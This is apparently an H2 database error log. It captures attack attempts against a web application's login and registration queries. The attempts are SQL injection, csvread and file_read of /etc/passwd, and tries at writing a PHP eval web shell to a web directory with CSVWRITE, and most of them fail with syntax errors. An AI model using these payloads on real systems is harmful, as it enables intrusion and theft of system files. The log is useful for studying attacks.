+org.h2.jdbc.JdbcSQLException: Scalar subquery contains more than one row; SQL statement:
+select GROUP_CONCAT((select * from csvread('/etc/passwd'))) [90053-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.expression.Subquery.getValue(Subquery.java:42)
+	at org.h2.expression.Aggregate.updateAggregate(Aggregate.java:247)
+	at org.h2.command.dml.Select.queryGroup(Select.java:356)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:641)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:34:24 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username='a'[*]'"; SQL statement:
+SELECT * FROM users WHERE username='a'' [42000-178]
+06-16 11:34:25 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username='a'[*]'"; SQL statement:
+SELECT * FROM users WHERE username='a'' [42000-178]
+06-16 11:34:57 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', 'adaadw', ''', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'adaadw', ''', '220.133.209.6') [42000-178]
+06-16 11:35:02 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', 'adaadw', ''', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'adaadw', ''', '220.133.209.6') [42000-178]
+06-16 11:35:08 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO USERS(ROLE, USERNAME, PASSWORD, IP) VALUES('user', 'adaadw', '' "; expected "[, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, ,, )"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'adaadw', '' [42001-178]
+06-16 11:35:09 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO USERS(ROLE, USERNAME, PASSWORD, IP) VALUES('user', 'adaadw', '' "; expected "[, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, ,, )"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'adaadw', '' [42001-178]
+06-16 11:35:19 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "A1" not found; SQL statement:
+ select a1 [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.command.dml.Select.prepare(Select.java:831)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:36:16 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Function "FILE_WIT" not found; SQL statement:
+ select file_wit('/tmp/aaa', 'select 111') [90022-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.command.Parser.readJavaFunction(Parser.java:2326)
+	at org.h2.command.Parser.readFunction(Parser.java:2378)
+	at org.h2.command.Parser.readTerm(Parser.java:2712)
+	at org.h2.command.Parser.readFactor(Parser.java:2244)
+	at org.h2.command.Parser.readSum(Parser.java:2231)
+	at org.h2.command.Parser.readConcat(Parser.java:2201)
+	at org.h2.command.Parser.readCondition(Parser.java:2051)
+	at org.h2.command.Parser.readAnd(Parser.java:2023)
+	at org.h2.command.Parser.readExpression(Parser.java:2015)
+	at org.h2.command.Parser.parseSelectSimpleSelectPart(Parser.java:1927)
+	at org.h2.command.Parser.parseSelectSimple(Parser.java:1959)
+	at org.h2.command.Parser.parseSelectSub(Parser.java:1853)
+	at org.h2.command.Parser.parseSelectUnion(Parser.java:1674)
+	at org.h2.command.Parser.parseSelect(Parser.java:1662)
+	at org.h2.command.Parser.parsePrepared(Parser.java:434)
+	at org.h2.command.Parser.parse(Parser.java:306)
+	at org.h2.command.Parser.parse(Parser.java:278)
+	at org.h2.command.Parser.prepareCommand(Parser.java:243)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:53:07 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Function "AFISSLE_WRITE" not found; SQL statement:
+ select afissle_write('/tmp/aaa', '111') [90022-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.command.Parser.readJavaFunction(Parser.java:2326)
+	at org.h2.command.Parser.readFunction(Parser.java:2378)
+	at org.h2.command.Parser.readTerm(Parser.java:2712)
+	at org.h2.command.Parser.readFactor(Parser.java:2244)
+	at org.h2.command.Parser.readSum(Parser.java:2231)
+	at org.h2.command.Parser.readConcat(Parser.java:2201)
+	at org.h2.command.Parser.readCondition(Parser.java:2051)
+	at org.h2.command.Parser.readAnd(Parser.java:2023)
+	at org.h2.command.Parser.readExpression(Parser.java:2015)
+	at org.h2.command.Parser.parseSelectSimpleSelectPart(Parser.java:1927)
+	at org.h2.command.Parser.parseSelectSimple(Parser.java:1959)
+	at org.h2.command.Parser.parseSelectSub(Parser.java:1853)
+	at org.h2.command.Parser.parseSelectUnion(Parser.java:1674)
+	at org.h2.command.Parser.parseSelect(Parser.java:1662)
+	at org.h2.command.Parser.parsePrepared(Parser.java:434)
+	at org.h2.command.Parser.parse(Parser.java:306)
+	at org.h2.command.Parser.parse(Parser.java:278)
+	at org.h2.command.Parser.prepareCommand(Parser.java:243)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:53:11 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Function "FISSLE_WRITE" not found; SQL statement:
+ select fissle_write('/tmp/aaa', '111') [90022-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.command.Parser.readJavaFunction(Parser.java:2326)
+	at org.h2.command.Parser.readFunction(Parser.java:2378)
+	at org.h2.command.Parser.readTerm(Parser.java:2712)
+	at org.h2.command.Parser.readFactor(Parser.java:2244)
+	at org.h2.command.Parser.readSum(Parser.java:2231)
+	at org.h2.command.Parser.readConcat(Parser.java:2201)
+	at org.h2.command.Parser.readCondition(Parser.java:2051)
+	at org.h2.command.Parser.readAnd(Parser.java:2023)
+	at org.h2.command.Parser.readExpression(Parser.java:2015)
+	at org.h2.command.Parser.parseSelectSimpleSelectPart(Parser.java:1927)
+	at org.h2.command.Parser.parseSelectSimple(Parser.java:1959)
+	at org.h2.command.Parser.parseSelectSub(Parser.java:1853)
+	at org.h2.command.Parser.parseSelectUnion(Parser.java:1674)
+	at org.h2.command.Parser.parseSelect(Parser.java:1662)
+	at org.h2.command.Parser.parsePrepared(Parser.java:434)
+	at org.h2.command.Parser.parse(Parser.java:306)
+	at org.h2.command.Parser.parse(Parser.java:278)
+	at org.h2.command.Parser.prepareCommand(Parser.java:243)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:53:15 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Function "FILE_WRITE" not found; SQL statement:
+ select file_write('/tmp/aaa', '111') [90022-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.command.Parser.readJavaFunction(Parser.java:2326)
+	at org.h2.command.Parser.readFunction(Parser.java:2378)
+	at org.h2.command.Parser.readTerm(Parser.java:2712)
+	at org.h2.command.Parser.readFactor(Parser.java:2244)
+	at org.h2.command.Parser.readSum(Parser.java:2231)
+	at org.h2.command.Parser.readConcat(Parser.java:2201)
+	at org.h2.command.Parser.readCondition(Parser.java:2051)
+	at org.h2.command.Parser.readAnd(Parser.java:2023)
+	at org.h2.command.Parser.readExpression(Parser.java:2015)
+	at org.h2.command.Parser.parseSelectSimpleSelectPart(Parser.java:1927)
+	at org.h2.command.Parser.parseSelectSimple(Parser.java:1959)
+	at org.h2.command.Parser.parseSelectSub(Parser.java:1853)
+	at org.h2.command.Parser.parseSelectUnion(Parser.java:1674)
+	at org.h2.command.Parser.parseSelect(Parser.java:1662)
+	at org.h2.command.Parser.parsePrepared(Parser.java:434)
+	at org.h2.command.Parser.parse(Parser.java:306)
+	at org.h2.command.Parser.parse(Parser.java:278)
+	at org.h2.command.Parser.prepareCommand(Parser.java:243)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:53:53 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO USERS(ROLE, USERNAME, PASSWORD, IP) VALUES('user', '11', 'xxx',SELECT FILE_READ('/etc/passwd') "; expected "[, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, AS, ,, FROM, WHERE, GROUP, HAVING, UNION, MINUS, EXCEPT, INTERSECT, ORDER, OFFSET, FETCH, LIMIT, FOR, [, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, ,, )"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', '11', 'xxx',select file_read('/etc/passwd') [42001-178]
+06-16 11:54:40 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Function "CSVWIRTE" not found; SQL statement:
+select csvwirte('/tmp/aaa', 'select 1') [90022-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.command.Parser.readJavaFunction(Parser.java:2326)
+	at org.h2.command.Parser.readFunction(Parser.java:2378)
+	at org.h2.command.Parser.readTerm(Parser.java:2712)
+	at org.h2.command.Parser.readFactor(Parser.java:2244)
+	at org.h2.command.Parser.readSum(Parser.java:2231)
+	at org.h2.command.Parser.readConcat(Parser.java:2201)
+	at org.h2.command.Parser.readCondition(Parser.java:2051)
+	at org.h2.command.Parser.readAnd(Parser.java:2023)
+	at org.h2.command.Parser.readExpression(Parser.java:2015)
+	at org.h2.command.Parser.parseSelectSimpleSelectPart(Parser.java:1927)
+	at org.h2.command.Parser.parseSelectSimple(Parser.java:1959)
+	at org.h2.command.Parser.parseSelectSub(Parser.java:1853)
+	at org.h2.command.Parser.parseSelectUnion(Parser.java:1674)
+	at org.h2.command.Parser.parseSelect(Parser.java:1662)
+	at org.h2.command.Parser.parsePrepared(Parser.java:434)
+	at org.h2.command.Parser.parse(Parser.java:306)
+	at org.h2.command.Parser.parse(Parser.java:278)
+	at org.h2.command.Parser.prepareCommand(Parser.java:243)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:54:46 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Function "CSV_WIRTE" not found; SQL statement:
+select csv_wirte('/tmp/aaa', 'select 1') [90022-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.command.Parser.readJavaFunction(Parser.java:2326)
+	at org.h2.command.Parser.readFunction(Parser.java:2378)
+	at org.h2.command.Parser.readTerm(Parser.java:2712)
+	at org.h2.command.Parser.readFactor(Parser.java:2244)
+	at org.h2.command.Parser.readSum(Parser.java:2231)
+	at org.h2.command.Parser.readConcat(Parser.java:2201)
+	at org.h2.command.Parser.readCondition(Parser.java:2051)
+	at org.h2.command.Parser.readAnd(Parser.java:2023)
+	at org.h2.command.Parser.readExpression(Parser.java:2015)
+	at org.h2.command.Parser.parseSelectSimpleSelectPart(Parser.java:1927)
+	at org.h2.command.Parser.parseSelectSimple(Parser.java:1959)
+	at org.h2.command.Parser.parseSelectSub(Parser.java:1853)
+	at org.h2.command.Parser.parseSelectUnion(Parser.java:1674)
+	at org.h2.command.Parser.parseSelect(Parser.java:1662)
+	at org.h2.command.Parser.parsePrepared(Parser.java:434)
+	at org.h2.command.Parser.parse(Parser.java:306)
+	at org.h2.command.Parser.parse(Parser.java:278)
+	at org.h2.command.Parser.prepareCommand(Parser.java:243)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:54:56 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Function "CSVWIRTE" not found; SQL statement:
+select csvwirte('/tmp/aaa', 'select 1') [90022-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.command.Parser.readJavaFunction(Parser.java:2326)
+	at org.h2.command.Parser.readFunction(Parser.java:2378)
+	at org.h2.command.Parser.readTerm(Parser.java:2712)
+	at org.h2.command.Parser.readFactor(Parser.java:2244)
+	at org.h2.command.Parser.readSum(Parser.java:2231)
+	at org.h2.command.Parser.readConcat(Parser.java:2201)
+	at org.h2.command.Parser.readCondition(Parser.java:2051)
+	at org.h2.command.Parser.readAnd(Parser.java:2023)
+	at org.h2.command.Parser.readExpression(Parser.java:2015)
+	at org.h2.command.Parser.parseSelectSimpleSelectPart(Parser.java:1927)
+	at org.h2.command.Parser.parseSelectSimple(Parser.java:1959)
+	at org.h2.command.Parser.parseSelectSub(Parser.java:1853)
+	at org.h2.command.Parser.parseSelectUnion(Parser.java:1674)
+	at org.h2.command.Parser.parseSelect(Parser.java:1662)
+	at org.h2.command.Parser.parsePrepared(Parser.java:434)
+	at org.h2.command.Parser.parse(Parser.java:306)
+	at org.h2.command.Parser.parse(Parser.java:278)
+	at org.h2.command.Parser.prepareCommand(Parser.java:243)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:55:36 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "<[*]?PHP EVAL($_POST[CMD]);?> "; SQL statement:
+<?php eval($_POST[cmd]);?> [42000-178]
+06-16 11:55:36 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "<[*]?PHP EVAL($_POST[CMD]);?> "; SQL statement:
+<?php eval($_POST[cmd]);?> [42000-178]
+06-16 11:55:54 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "<[*]PHP EVAL($_POST[CMD]);?> "; SQL statement:
+<php eval($_POST[cmd]);?> [42000-178]
+06-16 11:55:54 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "<[*]PHP EVAL($_POST[CMD]);?> "; SQL statement:
+<php eval($_POST[cmd]);?> [42000-178]
+06-16 11:56:08 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "<[*]PHP "; SQL statement:
+<php [42000-178]
+06-16 11:56:08 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "<[*]PHP "; SQL statement:
+<php [42000-178]
+06-16 11:56:12 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "<>[*]PHP "; SQL statement:
+<>php [42000-178]
+06-16 11:56:12 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "<>[*]PHP "; SQL statement:
+<>php [42000-178]
+06-16 11:56:27 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "a" not found; SQL statement:
+select "a" [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.command.dml.Select.prepare(Select.java:831)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeQuery(JdbcStatement.java:75)
+	at org.h2.tools.Csv.write(Csv.java:169)
+	at org.h2.expression.Function.getValueWithArgs(Function.java:1540)
+	at org.h2.expression.Function.getValue(Function.java:579)
+	at org.h2.command.dml.Select.queryFlat(Select.java:540)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:646)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:56:27 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "a" not found; SQL statement:
+select "a" [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.command.dml.Select.prepare(Select.java:831)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeQuery(JdbcStatement.java:75)
+	at org.h2.tools.Csv.write(Csv.java:169)
+	at org.h2.expression.Function.getValueWithArgs(Function.java:1540)
+	at org.h2.expression.Function.getValue(Function.java:579)
+	at org.h2.command.dml.Select.queryFlat(Select.java:540)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:646)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:56:32 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT CSVWRITE('/www/h2/a.php', 'select 'A[*]'') "; expected "[, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, ,, )"; SQL statement:
+select CSVWRITE('/www/h2/a.php', 'select 'a'') [42001-178]
+06-16 11:56:40 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT CSVWRITE('/www/h2/a.php', 'select \'A[*]\'') "; expected "[, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, ,, )"; SQL statement:
+select CSVWRITE('/www/h2/a.php', 'select \'a\'') [42001-178]
+06-16 11:58:25 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:58:25 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '220.133.209.6') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 12:11:56 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 12:11:56 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '220.133.209.6') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 12:12:18 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 12:12:18 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '220.133.209.6') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 12:12:52 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 12:12:52 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '220.133.209.6') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 12:13:31 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6[*]')"; SQL statement:
